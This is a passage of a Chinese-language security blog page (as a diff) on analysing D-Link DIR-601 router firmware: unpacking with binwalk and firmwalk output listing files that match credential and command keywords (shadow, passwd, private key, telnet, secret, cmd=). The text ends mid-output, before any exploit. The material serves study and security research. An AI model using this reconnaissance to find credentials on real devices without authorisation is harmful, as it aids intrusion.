@@ -1,0 +1,780 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="GroundCtl2MajorTom">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="dir-601固件分析前言固件有些老，但作为初学者有一定的学习参考价值。：） 信息搜集固件名：DIR601B1_FW202NAb01.bin  型号：dir-601 版本：FW202NAb01 官网：https:&#x2F;&#x2F;www.DLINK.com&#x2F; 测试环境：Ubuntu 22.04  binwalk -Me解包 进入squashfs文件系统  firmwalk进行枚举 123456789101112">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dir-601固件分析">
+<meta property="og:url" content="http://groundctl2majortom.github.io/2024/08/10/dir-601%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="GroundCtl2MajorTom">
+<meta property="og:description" content="dir-601固件分析前言固件有些老，但作为初学者有一定的学习参考价值。：） 信息搜集固件名：DIR601B1_FW202NAb01.bin  型号：dir-601 版本：FW202NAb01 官网：https:&#x2F;&#x2F;www.DLINK.com&#x2F; 测试环境：Ubuntu 22.04  binwalk -Me解包 进入squashfs文件系统  firmwalk进行枚举 123456789101112">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728212550443.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728214057449.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728214247010.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729113623698.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/08/10/dir-601%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/image-20240729114058448.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728215127221.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728215658086.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729141058443.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729141140246.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729141248307.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729142151923.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729142226257.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728164709522.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728170547941.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728170620082.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728190750323.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728190934765.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728191139422.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728203715351.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/08/10/dir-601%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/image-20240728204044172.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728214835092.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/7771105a3059461c2f1bda87870c.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728152148638.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728152516906.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728160548312.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728160239990.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728160907600.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728160930147.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728161051539.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728161436266.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728162007173.png">
+<meta property="article:published_time" content="2024-08-10T03:45:16.000Z">
+<meta property="article:modified_time" content="2024-09-04T06:50:19.708Z">
+<meta property="article:author" content="GroundCtl2MajorTom">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728212550443.png">
+  
+  
+  
+  <title>dir-601固件分析 - GroundCtl2MajorTom</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"groundctl2majortom.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>GroundCtl2majorTom</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="dir-601固件分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-10 11:45" pubdate>
+          2024年8月10日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          27 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">dir-601固件分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="dir-601固件分析"><a href="#dir-601固件分析" class="headerlink" title="dir-601固件分析"></a>dir-601固件分析</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>固件有些老，但作为初学者有一定的学习参考价值。：）</p>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>固件名：DIR601B1_FW202NAb01.bin</p>
+<ul>
+<li>型号：dir-601</li>
+<li>版本：FW202NAb01</li>
+<li>官网：<a target="_blank" rel="noopener" href="https://www.dlink.com/">https://www.DLINK.com/</a></li>
+<li>测试环境：Ubuntu 22.04</li>
+</ul>
+<p>binwalk -Me解包</p>
+<p>进入squashfs文件系统</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728212550443.png" srcset="/img/loading.gif" lazyload alt="image-20240728212550443"></p>
+<p>firmwalk进行枚举</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs crystal">-------------------- admin --------------------<br><span class="hljs-regexp">/mnt/services</span><br><span class="hljs-regexp">/mnt/nvram</span>.default<br><span class="hljs-regexp">/mnt/shadow</span><br><span class="hljs-regexp">/mnt/passwd</span><br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/hints</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/help</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/lang</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/msg</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/login</span>_real.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/support</span>_men.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wizard</span>_default.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/st</span>_routing.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/support</span>_tools.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wizard</span>_wan.htm<br><br>-------------------- root --------------------<br><span class="hljs-regexp">/lib/libip</span>6tc.so.<span class="hljs-number">0.0</span>.<span class="hljs-number">0</span><br><span class="hljs-regexp">/lib/libip</span>4tc.so.<span class="hljs-number">0.0</span>.<span class="hljs-number">0</span><br><span class="hljs-regexp">/lib/pppd</span><span class="hljs-regexp">/2.4.4/rp</span>-pppoe.so<br><span class="hljs-regexp">/lib/libavahi</span>-core.so.<span class="hljs-number">7.0</span>.<span class="hljs-number">2</span><br><span class="hljs-regexp">/sbin/ip</span><br><span class="hljs-regexp">/sbin/igmpproxy</span><br><span class="hljs-regexp">/sbin/tc</span><br><span class="hljs-regexp">/sbin/pppoe</span>-relay<br><span class="hljs-regexp">/sbin/clink</span><br><span class="hljs-regexp">/sbin/dnsmasq</span><br><span class="hljs-regexp">/sbin/avahi</span>-daemon<br><span class="hljs-regexp">/sbin/inadyn</span><br><span class="hljs-regexp">/sbin/miniupnpd</span><br><span class="hljs-regexp">/sbin/pppd</span><br><span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/hostapd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/wan</span>_manager<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/lighttpd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/my</span>_cgi.cgi<br><span class="hljs-regexp">/mnt/lighttpd</span><span class="hljs-regexp">/lighttpd.conf</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/shadow</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/passwd</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/html_info.xml</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/hints.xml</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/help.xml</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/lang.xml</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/rule_num.xml</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/msg.xml</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/rt</span><span class="hljs-regexp">/tools_admin.htm</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/js</span><span class="hljs-regexp">/public.js</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/group</span><br><span class="hljs-regexp">/bin</span><span class="hljs-regexp">/busybox</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- password --------------------</span><br><span class="hljs-regexp">/lib</span><span class="hljs-regexp">/libuClibc-0.9.30.so</span><br><span class="hljs-regexp">/lib</span><span class="hljs-regexp">/pppd/</span><span class="hljs-number">2.4</span>.<span class="hljs-number">3</span>/openl2tp/ppp_unix.so<br><span class="hljs-regexp">/sbin/msmtp</span><br><span class="hljs-regexp">/sbin/inadyn</span><br><span class="hljs-regexp">/sbin/pppd</span><br><span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/hostapd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/widgetd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/my_cgi.cgi</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/daemon</span>_manager<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/hints</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/help</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/lang</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/msg</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wireless</span>.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/tools</span>_email.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/tools</span>_admin.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/login</span>_real.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/tools</span>_ddns.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wan</span>_pptp.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wan</span>_l2tp.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wizard</span>_default.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wan</span>_poe.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wizard</span>_wan.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/js/public</span>.js<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/js/jquery</span>-<span class="hljs-number">1.4</span>.<span class="hljs-number">2</span>.min.js<br><span class="hljs-regexp">/mnt/wpa</span>2/hostapd.eap_user<br><span class="hljs-regexp">/bin/busybox</span><br><br>-------------------- passwd --------------------<br><span class="hljs-regexp">/lib/libu</span>Clibc-<span class="hljs-number">0.9</span>.<span class="hljs-number">30</span>.so<br><span class="hljs-regexp">/sbin/msmtp</span><br><span class="hljs-regexp">/sbin/pppd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/mailosd</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/services</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/nsswitch.conf</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- pwd --------------------</span><br><span class="hljs-regexp">/lib</span><span class="hljs-regexp">/libuClibc-0.9.30.so</span><br><span class="hljs-regexp">/bin</span><span class="hljs-regexp">/busybox</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- dropbear --------------------</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- ssl --------------------</span><br><span class="hljs-regexp">/sbin</span><span class="hljs-regexp">/msmtp</span><br><span class="hljs-regexp">/sbin</span><span class="hljs-regexp">/crowdcontrol</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/lighttpd</span><br><span class="hljs-regexp">/mnt/lighttpd</span><span class="hljs-regexp">/lighttpd.conf</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- private key --------------------</span><br><span class="hljs-regexp">/sbin</span><span class="hljs-regexp">/msmtp</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- telnet --------------------</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/services</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/rt</span><span class="hljs-regexp">/adv_virtual.htm</span><br><span class="hljs-regexp">/bin</span><span class="hljs-regexp">/busybox</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- secret --------------------</span><br><span class="hljs-regexp">/lib</span><span class="hljs-regexp">/libwpa_common.so</span><br><span class="hljs-regexp">/sbin</span><span class="hljs-regexp">/pppd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/lib/libwpa</span>_common.so<br><span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/openl2tpd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/widgetd</span><br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/help</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/lang</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/js/object</span>.js<br><br>-------------------- pgp --------------------<br><span class="hljs-regexp">/mnt/lighttpd</span><span class="hljs-regexp">/conf.d/mime</span>.conf<br><br>-------------------- gpg --------------------<br><br>-------------------- token --------------------<br><span class="hljs-regexp">/lib/libexpat</span>.so.<span class="hljs-number">1.5</span>.<span class="hljs-number">2</span><br><span class="hljs-regexp">/sbin/igmpproxy</span><br><span class="hljs-regexp">/sbin/tc</span><br><span class="hljs-regexp">/sbin/pppd</span><br><span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/hostapd</span><br><span class="hljs-regexp">/bin</span><span class="hljs-regexp">/busybox</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- api key --------------------</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- oauth --------------------</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- cmd= --------------------</span><br><span class="hljs-regexp">/lib</span><span class="hljs-regexp">/modules/statistics</span>_module.ko<br><br>-------------------- exec= --------------------<br><br>-------------------- command= --------------------<br><span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/hostapd</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- config --------------------</span><br><span class="hljs-regexp">/lib</span><span class="hljs-regexp">/modules/</span><span class="hljs-number">2.6</span>.<span class="hljs-number">31</span>/net/ath_dev.ko<br><span class="hljs-regexp">/lib/libu</span>Clibc-<span class="hljs-number">0.9</span>.<span class="hljs-number">30</span>.so<br><span class="hljs-regexp">/lib/pppd</span><span class="hljs-regexp">/2.4.3/openl</span>2tp/ppp_unix.so<br><span class="hljs-regexp">/sbin/udhcpd</span><br><span class="hljs-regexp">/sbin/ip</span><br><span class="hljs-regexp">/sbin/igmpproxy</span><br><span class="hljs-regexp">/sbin/dnsmasq</span><br><span class="hljs-regexp">/sbin/inadyn</span><br><span class="hljs-regexp">/sbin/miniupnpd</span><br><span class="hljs-regexp">/sbin/pppd</span><br><span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/hostapd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/sbin/wpatalk</span><br><span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/openl2tpd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/lighttpd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/wlan_manager</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/lighttpd/modules</span>.conf<br><span class="hljs-regexp">/mnt/lighttpd</span><span class="hljs-regexp">/lighttpd.conf</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span 